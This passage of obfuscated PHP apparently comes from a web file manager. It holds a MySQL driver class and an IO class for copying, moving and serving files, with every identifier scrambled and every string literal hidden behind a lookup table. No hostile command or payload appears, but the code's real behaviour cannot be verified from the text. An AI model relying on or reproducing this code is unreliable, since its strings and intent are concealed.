(!$this->linkID[$ß§õõŠ—] || !empty($¦ù¯×Œ[$¶³àğà[21]]) && !mysql_select_db($¦ù¯×Œ[$¶³àğà[21]], $this->linkID[$ß§õõŠ—])) { think_exception(mysql_error()); } $‹Ÿ²”ƒ¹ = mysql_get_server_info($this->linkID[$ß§õõŠ—]); mysql_query($¶³àğà[1000] . think_config($¶³àğà[1001]) . $¶³àğà[58], $this->linkID[$ß§õõŠ—]); if ($‹Ÿ²”ƒ¹ > $¶³àğà[1002]) { mysql_query($¶³àğà[1003], $this->linkID[$ß§õõŠ—]); } $this->connected = !0; if (1 != think_config($¶³àğà[22])) { unset($this->config); } } return $this->linkID[$ß§õõŠ—]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ÆÜéÀâÒ) { $²ÌğÍÁ… =& $_SERVER[€ä¾™²]; if (0 === stripos($ÆÜéÀâÒ, $²ÌğÍÁ…[343])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÆÜéÀâÒ; if ($this->queryID) { $this->free(); } think_action_status($²ÌğÍÁ…[23], 1); think_status($²ÌğÍÁ…[24]); $this->queryID = mysql_query($ÆÜéÀâÒ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ßÕÛßøÀ) { $àÜâËÉÃ =& $_SERVER[€ä¾™²]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ßÕÛßøÀ; if ($this->queryID) { $this->free(); } think_action_status($àÜâËÉÃ[25], 1); think_status($àÜâËÉÃ[24]); $Şîİ¼ã = mysql_query($ßÕÛßøÀ, $this->_linkID); $this->debug(); if (!1 === $Şîİ¼ã) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[€ä¾™²][1004], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ú®¶ÄåĞ = mysql_query($_SERVER[€ä¾™²][1005], $this->_linkID); $this->transTimes = 0; if (!$Ú®¶ÄåĞ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¸Òš›ë§ = mysql_query($_SERVER[€ä¾™²][1006], $this->_linkID); $this->transTimes = 0; if (!$¸Òš›ë§) { $this->error(); return !1; } } return !0; } private function getAll() { $ÁÁ¤÷·À = array(); if ($this->numRows > 0) { while ($¯¶ìƒ©à = mysql_fetch_assoc($this->queryID)) { $ÁÁ¤÷·À[] = $¯¶ìƒ©à; } mysql_data_seek($this->queryID, 0); } return $ÁÁ¤÷·À; } public function getFields($·†ÆÆü—) { $ß¿ıˆù“ =& $_SERVER[€ä¾™²]; $ëÔÅ´è = $this->query($ß¿ıˆù“[1007] . $this->parseKey($·†ÆÆü—)); $ğë‡Ï’Á = array(); if ($ëÔÅ´è) { foreach ($ëÔÅ´è as $åØºåîä => $ØÍËá¨) { $ğë‡Ï’Á[$ØÍËá¨[$ß¿ıˆù“[31]]] = array($ß¿ıˆù“[32] => $ØÍËá¨[$ß¿ıˆù“[31]], $ß¿ıˆù“[33] => $ØÍËá¨[$ß¿ıˆù“[34]], $ß¿ıˆù“[35] => (bool) (strtoupper($ØÍËá¨[$ß¿ıˆù“[36]]) === $ß¿ıˆù“[1008]), $ß¿ıˆù“[37] => $ØÍËá¨[$ß¿ıˆù“[38]], $ß¿ıˆù“[39] => strtolower($ØÍËá¨[$ß¿ıˆù“[40]]) == $ß¿ıˆù“[41], $ß¿ıˆù“[42] => strtolower($ØÍËá¨[$ß¿ıˆù“[43]]) == $ß¿ıˆù“[44]); } } return $ğë‡Ï’Á; } public function getTables($¹›£‘ò = '') { $ùÍèÄôÎ =& $_SERVER[€ä¾™²]; if (!empty($¹›£‘ò)) { $±ŠÂ¤ºæ = $ùÍèÄôÎ[1009] . $¹›£‘ò . $ùÍèÄôÎ[1010]; } else { $±ŠÂ¤ºæ = $ùÍèÄôÎ[1011]; } $ÃŸÕÕà = $this->query($±ŠÂ¤ºæ); $×Ä×ô– = array(); foreach ($ÃŸÕÕà as $º¦Ã®óš => $¤÷¢Ê‰ö) { $×Ä×ô–[$º¦Ã®óš] = current($¤÷¢Ê‰ö); } return $×Ä×ô–; } public function replace($ú²«ˆ¡õ, $´ˆÓÛ–ê = array()) { $Ï’µşï± =& $_SERVER[€ä¾™²]; foreach ($ú²«ˆ¡õ as $ˆãîé  => $“÷çê¦Ş) { $œŞü§şı = $this->parseValue($“÷çê¦Ş); if (is_scalar($œŞü§şı)) { $ä›Â¸¨²[] = $œŞü§şı; $Ÿ›ü€²¬[] = $this->parseKey($ˆãîé ); } } $Åš’¹ = $Ï’µşï±[1012] . $this->parseTable($´ˆÓÛ–ê[$Ï’µşï±[358]]) . $Ï’µşï±[1013] . implode($Ï’µşï±[50], $Ÿ›ü€²¬) . $Ï’µşï±[1014] . implode($Ï’µşï±[50], $ä›Â¸¨²) . $Ï’µşï±[1015]; return $this->execute($Åš’¹); } public function insertAll($Â©¯¥, $Ç’ãÅ“ = array(), $µ€àŸ“é = false) { $¤ÌÇæœ =& $_SERVER[€ä¾™²]; if (!is_array($Â©¯¥[0])) { return !1; } $òŞĞÎ­¤ = array_keys($Â©¯¥[0]); $¨ğá‡íæ = array(); foreach ($Â©¯¥ as $Ë„òĞ™„) { $£§˜Çô = array(); foreach ($Ë„òĞ™„ as $£˜ÁŸíê => $¢ÙÑ) { $¢ÙÑ = $this->parseValue($¢ÙÑ); if (is_scalar($¢ÙÑ)) { $£§˜Çô[] = $¢ÙÑ; } } $¨ğá‡íæ[] = $¤ÌÇæœ[338] . implode($¤ÌÇæœ[50], $£§˜Çô) . $¤ÌÇæœ[1015]; } array_walk($òŞĞÎ­¤, array($this, $¤ÌÇæœ[1016])); $ Ì†´ªØ = $µ€àŸ“é ? $¤ÌÇæœ[1017] : $¤ÌÇæœ[1018]; $ Ì†´ªØ = $¤ÌÇæœ[1018]; $¯’ï½ª± = $ Ì†´ªØ . $¤ÌÇæœ[1019] . $this->parseTable($Ç’ãÅ“[$¤ÌÇæœ[358]]) . $¤ÌÇæœ[1013] . implode($¤ÌÇæœ[50], $òŞĞÎ­¤) . $¤ÌÇæœ[1020] . implode($¤ÌÇæœ[50], $¨ğá‡íæ); if ($µ€àŸ“é) { $ÑŸóõ×í = array(); foreach ($òŞĞÎ­¤ as $£˜ÁŸíê) { if ($£˜ÁŸíê == $¤ÌÇæœ[232] || $£˜ÁŸíê == $¤ÌÇæœ[1021]) { continue; } $ÑŸóõ×í[] = $£˜ÁŸíê . $¤ÌÇæœ[1022] . $£˜ÁŸíê . $¤ÌÇæœ[1015]; } $¯’ï½ª± .= $¤ÌÇæœ[1023] . implode($¤ÌÇæœ[50], $ÑŸóõ×í); } return $this->execute($¯’ï½ª±); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $¤¯Ûéà =& $_SERVER[€ä¾™²]; $this->error = mysql_errno() . $¤¯Ûéà[4] . mysql_error($this->_linkID); if ($¤¯Ûéà[12] != $this->queryStr) { $this->error .= LNG($¤¯Ûéà[48]) . $this->queryStr; } think_trace($this->error, $¤¯Ûéà[12], $¤¯Ûéà[49]); return $this->error; } public function escapeString($Û»½™×Ï) { if ($this->_linkID) { return mysql_real_escape_string($Û»½™×Ï, $this->_linkID); } else { return mysql_escape_string($Û»½™×Ï); } } public function parseKey(&$„øÄ²Œ“, $…ÀÀ“ç = true) { $«°é³Ï« =& $_SERVER[€ä¾™²]; if ($…ÀÀ“ç) { $„øÄ²Œ“ = $this->parseKeyCheck($„øÄ²Œ“); } if ($„øÄ²Œ“ != $«°é³Ï«[221] && !preg_match($«°é³Ï«[1024], $„øÄ²Œ“)) { $„øÄ²Œ“ = $«°é³Ï«[475] . trim($„øÄ²Œ“, $«°é³Ï«[475]) . $«°é³Ï«[475]; } return $„øÄ²Œ“; } } goto f†¨æˆìÆ¿; c¯çµ¸÷†ô: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($íàµ¿¿„, $™œ©Ö„) { $‰¸îœ×’ =& $_SERVER[€ä¾™²]; $¼÷œ”È¿ = $™œ©Ö„; $GLOBALS[$‰¸îœ×’[1274]] = $‰¸îœ×’[1275] . $íàµ¿¿„; Hook::trigger($‰¸îœ×’[1275] . $íàµ¿¿„ . $‰¸îœ×’[1276], $¼÷œ”È¿); $›’Ó¯ªä = self::driverMake($™œ©Ö„[0]); if (!$›’Ó¯ªä) { return !1; } if ($íàµ¿¿„ == $‰¸îœ×’[648] || $íàµ¿¿„ == $‰¸îœ×’[650] || $íàµ¿¿„ == $‰¸îœ×’[1277]) { if (!trim($›’Ó¯ªä->path . $‰¸îœ×’[463], $‰¸îœ×’[8])) { return !1; } } if (method_exists($›’Ó¯ªä, $íàµ¿¿„)) { $‚…à»Ÿö = @call_user_func_array(array($›’Ó¯ªä, $íàµ¿¿„), $™œ©Ö„); } else { if (method_exists($›’Ó¯ªä, $‰¸îœ×’[1278])) { $‚…à»Ÿö = @call_user_func_array(array($›’Ó¯ªä, $íàµ¿¿„), $™œ©Ö„); } else { if (method_exists(self, $íàµ¿¿„)) { $‚…à»Ÿö = @call_user_func_array(array(self, $íàµ¿¿„), $™œ©Ö„); } else { $‚…à»Ÿö = call_user_func_array(array(parent, $íàµ¿¿„), $™œ©Ö„); } } } Hook::trigger($‰¸îœ×’[1275] . $íàµ¿¿„ . $‰¸îœ×’[1279], $¼÷œ”È¿, $‚…à»Ÿö); return $‚…à»Ÿö; } public static function init($‡¬¶ÌÛ¨) { return self::driverMake($‡¬¶ÌÛ¨); } public static function copy($™µ÷î—î, $ïÉÈ¸ÇŞ, $œá´³Ôì = false, $ËİÁŒ‡æ = false) { return self::copyMoveStart($™µ÷î—î, $ïÉÈ¸ÇŞ, $œá´³Ôì, $_SERVER[€ä¾™²][648], $ËİÁŒ‡æ); } public static function move($òŸîšÀİ, $İÒ¹´¿, $Ù³Çİß = false, $×ÖŒµ„ô = false) { return self::copyMoveStart($òŸîšÀİ, $İÒ¹´¿, $Ù³Çİß, $_SERVER[€ä¾™²][650], $×ÖŒµ„ô); } public static function copyMoveChildren($ÓáÔñ¶, $ŞÅºÃˆò, $¬¬§«çĞ = "\x63\157\x70\x79", $ã©†õ×û = REPEAT_REPLACE) { $à¤¼¬ö¬ =& $_SERVER[€ä¾™²]; $‡˜•—î¥ = $ÓáÔñ¶; $í«ÃŸ»… = self::driverMake($ÓáÔñ¶); $Ó·şÌ¿Œ = $í«ÃŸ»…->listPath($ÓáÔñ¶, !0); $à¥Û¤Ü• = array_merge($Ó·şÌ¿Œ[$à¤¼¬ö¬[86]], $Ó·şÌ¿Œ[$à¤¼¬ö¬[85]]); foreach ($à¥Û¤Ü• as $˜ªé»ü¦) { self::copyMoveStart($˜ªé»ü¦[$à¤¼¬ö¬[87]], $ŞÅºÃˆò, $ã©†õ×û, $¬¬§«çĞ, !1); } if ($¬¬§«çĞ == $à¤¼¬ö¬[650]) { self::remove($‡˜•—î¥); } } private static function copyMoveStart($®†ÜØ²¢, $ãĞ•œ“÷, $‰×øì¡Ñ, $¯Áƒ¬Ú, $¯ê³¯¥‘) { $Ë°ª¢üí =& $_SERVER[€ä¾™²]; $ÇŒå§ü¡ = array($®†ÜØ²¢, $ãĞ•œ“÷, $‰×øì¡Ñ, $¯ê³¯¥‘); Hook::trigger($Ë°ª¢üí[1275] . $¯Áƒ¬Ú . $Ë°ª¢üí[1276], $ÇŒå§ü¡); $õ™¨×²© = self::copyMove($®†ÜØ²¢, $ãĞ•œ“÷, $‰×øì¡Ñ, $¯Áƒ¬Ú, $¯ê³¯¥‘); Hook::trigger($Ë°ª¢üí[1275] . $¯Áƒ¬Ú . $Ë°ª¢üí[1279], $ÇŒå§ü¡, $õ™¨×²©); return $õ™¨×²©; } public static function saveFile($Ë§ú·ùí, $à½‰áï, $‰Á…ìº› = true) { $í–×”Õş =& $_SERVER[€ä¾™²]; $ñí¤¤Ä” = self::info($à½‰áï); $˜÷‡Ğƒ = self::driverMake($Ë§ú·ùí); $ÔØÈöûÅ = self::driverMake($à½‰áï); $µÜ‰Åª = !1; if ($ÔØÈöûÅ->pathParse[$í–×”Õş[1280]]) { $µÜ‰Åª = $ÔØÈöûÅ; $áÜÈï¨ = $ÔØÈöûÅ->pathParse[$í–×”Õş[1280]]; $ÔØÈöûÅ = self::driverMake($áÜÈï¨); } if ($˜÷‡Ğƒ->pathParse[$í–×”Õş[1280]]) { $¨È¼óËÕ = $˜÷‡Ğƒ->pathParse[$í–×”Õş[1280]]; $˜÷‡Ğƒ = self::driverMake($¨È¼óËÕ); } $Û³¸Ìš— = $ÔØÈöûÅ->pathFather($à½‰áï); $±úÁ’ğÇ = !0; if (!$‰Á…ìº› && self::driverIsSame($˜÷‡Ğƒ, $ÔØÈöûÅ)) { $±úÁ’ğÇ = !1; } $¦®ÈñÜ˜ = self::copyFile($˜÷‡Ğƒ, $Ë§ú·ùí, $ÔØÈöûÅ, $Û³¸Ìš—, $ñí¤¤Ä”[$í–×”Õş[32]], $±úÁ’ğÇ); if ($µÜ‰Åª) { $¦®ÈñÜ˜ = $µÜ‰Åª->getPathOuter($¦®ÈñÜ˜); } return $¦®ÈñÜ˜; } private static function copyMove($ì½¦óü³, $˜¿°‚éƒ, $Ö–‰·ª‚, $ªªã€À­, $ŠÁ®‹¤ = false) { $ˆÙ­Ó‚º =& $_SERVER[€ä¾™²]; if (!$ì½¦óü³ || $ì½¦óü³ == $ˆÙ­Ó‚º[8] || !$˜¿°‚éƒ) { return !1; } ignore_timeout(); $áÕÂÜû² = self::driverMake($ì½¦óü³); $›«®´ëÚ = self::driverMake($˜¿°‚éƒ); $½Šà Ì¹ = $ªªã€À­ == $ˆÙ­Ó‚º[650]; $’²Á¬±Û = !1; if ($›«®´ëÚ->pathParse[$ˆÙ­Ó‚º[1280]]) { $’²Á¬±Û = $›«®´ëÚ; $˜¿°‚éƒ = $›«®´ëÚ->pathParse[$ˆÙ­Ó‚º[1280]]; $›«®´ëÚ = self::driverMake($˜¿°‚éƒ); } if ($áÕÂÜû²->pathParse[$ˆÙ­Ó‚º[1280]]) { $ì½¦óü³ = $áÕÂÜû²->pathParse[$ˆÙ­Ó‚º[1280]]; $áÕÂÜû² = self::driverMake($ì½¦óü³); } self::check($áÕÂÜû², $ì½¦óü³, $›«®´ëÚ, $˜¿°‚éƒ); Hook::trigger($ˆÙ­Ó‚º[1281], $áÕÂÜû², $ì½¦óü³, $›«®´ëÚ, $˜¿°‚éƒ); $¤••Úâ = self::driverIsSame($áÕÂÜû², $›«®´ëÚ); if ($¤••Úâ) { if ($ªªã€À­ == $ˆÙ­Ó‚º[650] && !method_exists($›«®´ëÚ, $ˆÙ­Ó‚º[1282]) && trim($˜¿°‚éƒ, $ˆÙ­Ó‚º[8]) == trim($›«®´ëÚ->pathFather($ì½¦óü³), $ˆÙ­Ó‚º[8])) { if ($áÕÂÜû²->pathThis($ì½¦óü³) != $ŠÁ®‹¤ && !$áÕÂÜû²->isOsDriver()) { return $áÕÂÜû²->rename($ì½¦óü³, $ŠÁ®‹¤); } return $›«®´ëÚ->getPathOuter($ì½¦óü³); } if (method_exists($›«®´ëÚ, $ªªã€À­)) { return $›«®´ëÚ->{$ªªã€À­}($ì½¦óü³, $˜¿°‚éƒ, $Ö–‰·ª‚, $ŠÁ®‹¤); } } if ($¤••Úâ && $ªªã€À­ == $ˆÙ­Ó‚º[650] && $›«®´ëÚ->getType() == $ˆÙ­Ó‚º[107]) { $¢‡Øó ê = $›«®´ëÚ->movePath($ì½¦óü³, $˜¿°‚éƒ, $ŠÁ®‹¤); if ($¢‡Øó ê) { return $¢‡Øó ê; } } $Ë °´÷ù = $áÕÂÜû²->isFile($ì½¦óü³); if (!$Ë °´÷ù && $›«®´ëÚ->getType() == $ˆÙ­Ó‚º[858] && $áÕÂÜû²->getType() == $ˆÙ­Ó‚º[107]) { $¢‡Øó ê = $›«®´ëÚ->copyFolderFromIO($áÕÂÜû², $ì½¦óü³, $˜¿°‚éƒ, $Ö–‰·ª‚, $½Šà Ì¹, $ŠÁ®‹¤); } else { $¢‡Øó ê = self::copyPath($áÕÂÜû², $ì½¦óü³, $›«®´ëÚ, $˜¿°‚éƒ, $Ö–‰·ª‚, $½Šà Ì¹, $Ë °´÷ù, $ŠÁ®‹¤); } if ($¢‡Øó ê && $½Šà Ì¹) { $áÕÂÜû²->remove($ì½¦óü³); } if ($’²Á¬±Û) { $¢‡Øó ê = $’²Á¬±Û->getPathOuter($¢‡Øó ê); } return $¢‡Øó ê; } private static function check($ôÄ™ìŠš, $ßéëú°¡, $£èô¢‡™, &$§ãäõ…) { $­šÕÖÎú =& $_SERVER[€ä¾™²]; if (self::driverIsSame($ôÄ™ìŠš, $£èô¢‡™) && $ôÄ™ìŠš->isFolder($ßéëú°¡) && $ôÄ™ìŠš->isParentOf($ßéëú°¡, $§ãäõ…)) { show_json(LNG($­šÕÖÎú[1283]), !1); } if (!$ôÄ™ìŠš->exist($ßéëú°¡)) { show_json(LNG($­šÕÖÎú[106]), !1); } } private static function copyPath($îõÂòš, $î˜µÀû, $•¢­¼‚â, $³ ö´™Ç, $Êù„¼Ğ†, $­ÕÅ¯ââ, $×Â‚ö±º, $âºËË£Ö = false, $Õ™ ı±Ô = true) { $ÉÎ„åå =& $_SERVER[€ä¾™²]; $Ÿã–ÂëŠ = empty($âºËË£Ö) && $âºËË£Ö !== $ÉÎ„åå[229] ? $îõÂòš->pathThis($î˜µÀû) : $âºËË£Ö; if ($Êù„¼Ğ†) { $ŠÃâå“š = $•¢­¼‚â->fileNameExist($³ ö´™Ç, $Ÿã–ÂëŠ); $ÇïŸÏ¡ = $Ÿã–ÂëŠ; $Ÿã–ÂëŠ = $•¢­¼‚â->fileNameAuto($³ ö´™Ç, $Ÿã–ÂëŠ, $Êù„¼Ğ†, !$×Â‚ö±º); if (!$ŠÃâå“š || $ÇïŸÏ¡ != $Ÿã–ÂëŠ) { $Êù„¼Ğ† = !1; } if ($Õ™ ı±Ô && !$Êù„¼Ğ†) { $•¢­¼‚â->_data[$ÉÎ„åå[1284]] = !0; } } if ($×Â‚ö±º) { return self::copyFile($îõÂòš, $î˜µÀû, $•¢­¼‚â, $³ ö´™Ç, $Ÿã–ÂëŠ, $­ÕÅ¯ââ); } if ($Êù„¼Ğ† == REPEAT_RENAME_FOLDER) { $Êù„¼Ğ† = !1; } $¥ˆ¦íò = rtrim($³ ö´™Ç, $ÉÎ„åå[8]) . $ÉÎ„åå[8] . $Ÿã–ÂëŠ; $ñ˜İéÖÊ = $•¢­¼‚â->mkdir($•¢­¼‚â->getPath($¥ˆ¦íò), $Êù„¼Ğ†); $³ ö´™Ç = $•¢­¼‚â->getPathInner($ñ˜İéÖÊ); $šºüÏÑ¬ = $îõÂòš->listPath($î˜µÀû, !0); $šºüÏÑ¬ = is_array($šºüÏÑ¬) ? $šºüÏÑ¬ : array($ÉÎ„åå[86] => array(), $ÉÎ„åå[85] => array()); $±Ê†äçá = array_merge($šºüÏÑ¬[$ÉÎ„åå[86]], $šºüÏÑ¬[$ÉÎ„åå[85]]); foreach ($±Ê†äçá as $Æ´œñÓ ) { $µ×¿ÓßÉ = $Æ´œñÓ [$ÉÎ„åå[33]] == $ÉÎ„åå[231]; $î˜µÀû = $îõÂòš->getPathInner($Æ´œñÓ [$ÉÎ„åå[87]]); $ıîÍöª¥ = self::copyPath($îõÂòš, $î˜µÀû, $•¢­¼‚â, $³ ö´™Ç, $Êù„¼Ğ†, $­ÕÅ¯ââ, $µ×¿ÓßÉ, !1, !1); if (!$ıîÍöª¥) { IO::errorTips($ÉÎ„åå[1285] . $î˜µÀû . $ÉÎ„åå[73] . $³ ö´™Ç); } } self::copyMoveKeepInfo($îõÂòš, $î˜µÀû, $ñ˜İéÖÊ); return $ñ˜İéÖÊ; } private static function copyFile($—®·¡—Æ, $Ø¯ù×ƒö, $è­›¤ú´, $ü§Ù¸å, $°ğ‘²¡…, $ÊÉÃ„İŠ) { $Á¨Œ§ÉŸ =& $_SERVER[€ä¾™²]; $ü§Ù¸å = $è­›¤ú´->getPath(rtrim($ü§Ù¸å, $Á¨Œ§ÉŸ[8]) . $Á¨Œ§ÉŸ[8] . $°ğ‘²¡…); $Ïãıº§ = $Á¨Œ§ÉŸ[1286] . time() . rand_string(5); Hook::trigger($Á¨Œ§ÉŸ[1287], $—®·¡—Æ, $Ø¯ù×ƒö, $è­›¤ú´, $ü§Ù¸å, $°ğ‘²¡…, $Ïãıº§); if (self::driverIsSame($—®·¡—Æ, $è­›¤ú´)) { if ($ÊÉÃ„İŠ) { $ÆˆÒŸÙÌ = $è­›¤ú´->moveFile($Ø¯ù×ƒö, $ü§Ù¸å); } else { $ÆˆÒŸÙÌ = $è­›¤ú´->copyFile($Ø¯ù×ƒö, $ü§Ù¸å); } Hook::trigger($Á¨Œ§ÉŸ[1288], $—®·¡—Æ, $Ø¯ù×ƒö, $è­›¤ú´, $ü§Ù¸å, $°ğ‘²¡…, $ÆˆÒŸÙÌ); self::copyMoveKeepInfo($—®·¡—Æ, $Ø¯ù×ƒö, $ÆˆÒŸÙÌ); return $ÆˆÒŸÙÌ; } $²óÎ­ÇÔ = TEMP_FILES; if ($GLOBALS[$Á¨Œ§ÉŸ[6]][$Á¨Œ§ÉŸ[92]][$Á¨Œ§ÉŸ[900]]) { $²óÎ­ÇÔ = $GLOBALS[$Á¨Œ§ÉŸ[6]][$Á¨Œ§ÉŸ[92]][$Á¨Œ§ÉŸ[900]]; } $‚íœçá‹ = $²óÎ­ÇÔ; mk_dir($‚íœçá‹); $™€‰ŒÉİ = $‚íœçá‹ . $Ïãıº§; $‘¼»‹ÁÌ = $™€‰ŒÉİ; $™€‰ŒÉİ = $—®·¡—Æ->download($Ø¯ù×ƒö, $™€‰ŒÉİ); $™€‰ŒÉİ = $—®·¡—Æ->iconvApp($™€‰ŒÉİ); if (substr($™€‰ŒÉİ, strlen($²óÎ­ÇÔ)) == $²óÎ­ÇÔ) { $ÊÉÃ„İŠ = !0; } $ÆˆÒŸÙÌ = $è­›¤ú´->upload($ü§Ù¸å, $™€‰ŒÉİ, $ÊÉÃ„İŠ); self::remove($‘¼»‹ÁÌ); Hook::trigger($Á¨Œ§ÉŸ[1288], $—®·¡—Æ, $Ø¯ù×ƒö, $è­›¤ú´, $ü§Ù¸å, $°ğ‘²¡…, $ÆˆÒŸÙÌ); self::copyMoveKeepInfo($—®·¡—Æ, $Ø¯ù×ƒö, $ÆˆÒŸÙÌ); return $ÆˆÒŸÙÌ; } private static function copyMoveKeepInfo($â“ĞêÍ, $Ò£¡Äë¾, $›ë àı) { if (!$›ë àı) { return; } $‹ŸÊÍ¢» = $â“ĞêÍ->info($Ò£¡Äë¾); if (!is_array($‹ŸÊÍ¢»)) { return; } IO::setModifyTime($›ë àı, $‹ŸÊÍ¢»[$_SERVER[€ä¾™²][88]]); } public static function pathFather($ûÁæéÂ¢) { $çŞŠÇÏÑ = IO::init($ûÁæéÂ¢); $‰ä©¿ï÷ = $çŞŠÇÏÑ->pathFather($çŞŠÇÏÑ->path); return $çŞŠÇÏÑ->getPathOuter($‰ä©¿ï÷); } public static function fileOut($È¡ÚÏ¶¨, $ĞŸ³íˆ› = false, $üÙ§ışÌ = false, $Şø©Âúõ = '') { $Æâ§Ù°½ = self::driverMake($È¡ÚÏ¶¨); if ($Æâ§Ù°½->isFileOutServer()) { return $Æâ§Ù°½->fileOutServer($È¡ÚÏ¶¨, $ĞŸ³íˆ›, $üÙ§ışÌ, $Şø©Âúõ); } return $Æâ§Ù°½->fileOut($È¡ÚÏ¶¨, $ĞŸ³íˆ›, $üÙ§ışÌ, $Şø©Âúõ); } public static function fileOutImage($Áø¡ÉÊï, $Ø‡íµ¼ = 250) { $…™ûĞ¾¾ = array(250, 600, 1200, 2000, 3000, 5000); for ($Çé”£ëä = 0; $Çé”£ëä < count($…™ûĞ¾¾); $Çé”£ëä++) { if ($Çé”£ëä == 0 && $Ø‡íµ¼ <= $…™ûĞ¾¾[$Çé”£ëä]) { $Ø‡íµ¼ = $…™ûĞ¾¾[$Çé”£ëä]; break; } else { if ($Ø‡íµ¼ > $…™ûĞ¾¾[$Çé”£ëä - 1] && $Ø‡íµ¼ <= $…™ûĞ¾¾[$Çé”£ëä]) { $Ø‡íµ¼ = $…™ûĞ¾¾[$Çé”£ëä]; break; } else { if ($Çé”£ëä == count($…™ûĞ¾¾) - 1 && $Ø‡íµ¼ > $…™ûĞ¾¾[$Çé”£ëä]) { $Ø‡íµ¼ = $…™ûĞ¾¾[$Çé”£ëä]; break; } } } } $ğ¶ãö = self::driverMake($Áø¡ÉÊï); if ($ğ¶ãö->isFileOutServer()) { return $ğ¶ãö->fileOutImageServer($Áø¡ÉÊï, $Ø‡íµ¼); } return $ğ¶ãö->fileOutImage($Áø¡ÉÊï, $Ø‡íµ¼); } private static function driverIsSame($—Àê‹ŠÙ, $”­íò£«) { $è»Œşü· =& $_SERVER[€ä¾™²]; $ºğâŞØ¬ = $—Àê‹ŠÙ->getType(); $®ı¾Ø¥ = $”­íò£«->getType(); if ($ºğâŞØ¬ != $®ı¾Ø¥) { return !1; } if ($ºğâŞØ¬ == $è»Œşü·[858]) { return !0; } if ($ºğâŞØ¬ == $è»Œşü·[107]) { return !0; } if ($—Àê‹ŠÙ->pathDriver == $”­íò£«->pathDriver) { return !0; } return !1; } public static function copyUpdate($ ëı± ã, $½‘‚¾ä) { $ª€ÈğÕ€ =& $_SERVER[€ä¾™²]; if (!IO::exist($ ëı± ã)) { return !1; } if (!IO::exist($½‘‚¾ä)) { IO::mkdir($½‘‚¾ä); } $Õ­†¿š = array_to_keyvalue(self::listAllSimple($ ëı± ã), $ª€ÈğÕ€[87]); $Å•³™Îö = array_to_keyvalue(self::listAllSimple($½‘‚¾ä), $ª€ÈğÕ€[87]); $ñ°ø¶Æ = array(); $ë÷ñ‘ô = array(); foreach ($Õ­†¿š as $ ‚«ëÍœ => $£šş÷æ) { if (isset($Å•³™Îö[$ ‚«ëÍœ])) { if ($£šş÷æ[$ª€ÈğÕ€[78]] == 1) { continue; } if ($Å•³™Îö[$ ‚«ëÍœ][$ª€ÈğÕ€[79]] == $£šş÷æ[$ª€ÈğÕ€[79]]) { continue; } } if ($£šş÷æ[$ª€ÈğÕ€[78]] == 1) { $ë÷ñ‘ô[] = $½‘‚¾ä . $ª€ÈğÕ€[8] . trim($ ‚«ëÍœ, $ª€ÈğÕ€[8]); continue; } $‰€â…ı¬ = strstr(trim($ ‚«ëÍœ, $ª€ÈğÕ€[8]), $ª€ÈğÕ€[8]) ? get_path_father($ ‚«ëÍœ) : $ª€ÈğÕ€[12]; $ñ°ø¶Æ[] = array($ª€ÈğÕ€[1289] => $£šş÷æ[$ª€ÈğÕ€[89]], $ª€ÈğÕ€[1290] => rtrim($½‘‚¾ä, $ª€ÈğÕ€[8]) . $ª€ÈğÕ€[8] . $‰€â…ı¬, $ª€ÈğÕ€[1291] => $£šş÷æ); } $±åù»™ü = array($ª€ÈğÕ€[231] => $ñ°ø¶Æ, $ª€ÈğÕ€[78] => $ë÷ñ‘ô); Hook::trigger($ª€ÈğÕ€[1292], $ ëı± ã, $½‘‚¾ä, $±åù»™ü); foreach ($ë÷ñ‘ô as $£šş÷æ) { IO::mkdir($£šş÷æ); } foreach ($ñ°ø¶Æ as $£šş÷æ) { IO::copy($£šş÷æ[$ª€ÈğÕ€[1289]], $£šş÷æ[$ª€ÈğÕ€[1290]], REPEAT_REPLACE); } } public static function fileSubstr($ğêÄŞØ, $—Ñ¨íû«, $¿ëŒ÷¢ = false) { $öû˜™§† =& $_SERVER[€ä¾™²]; $š’‘º¥ = self::driverMake($ğêÄŞØ); $ÌÚ÷°”¢ = $š’‘º¥->size($ğêÄŞØ); $±›ÒŒ¡ä = $—Ñ¨íû«; $É—ª¡Ø = $¿ëŒ÷¢; if ($—Ñ¨íû« < 0) { $—Ñ¨íû« = $ÌÚ÷°”¢ + $—Ñ¨íû«; } if ($¿ëŒ÷¢ === !1) { $¿ëŒ÷¢ = $ÌÚ÷°”¢ - $—Ñ¨íû«; } if ($—Ñ¨íû« + $¿ëŒ÷¢ > $ÌÚ÷°”¢) { $¿ëŒ÷¢ = $ÌÚ÷°”¢ - $—Ñ¨íû«; } if (!$ÌÚ÷°”¢ && $š’‘º¥->getType() == $öû˜™§†[107] && !$š’‘º¥->exist($ğêÄŞØ)) { $ÛÁ®í„ö = get_path_this($ğêÄŞØ); $‡”ïı—Æ = parse_url_query($ÛÁ®í„ö); if (is_array($‡”ïı—Æ) && isset($‡”ïı—Æ[$öû˜™§†[32]])) { $ÛÁ®í„ö = urldecode($‡”ïı—Æ[$öû˜™§†[32]]); } throw new Exception($öû˜™§†[1293] . LNG($öû˜™§†[1294]) . $öû˜™§†[1079] . clear_html($ÛÁ®í„ö) . $öû˜™§†[12]); } if ($¿ëŒ÷¢ <= 0) { return $öû˜™§†[12]; } if ($—Ñ¨íû« < 0 || $—Ñ¨íû« >= $ÌÚ÷°”¢ || $¿ëŒ÷¢ > $GLOBALS[$öû˜™§†[6]][$öû˜™§†[92]][$öû˜™§†[1295]]) { throw new 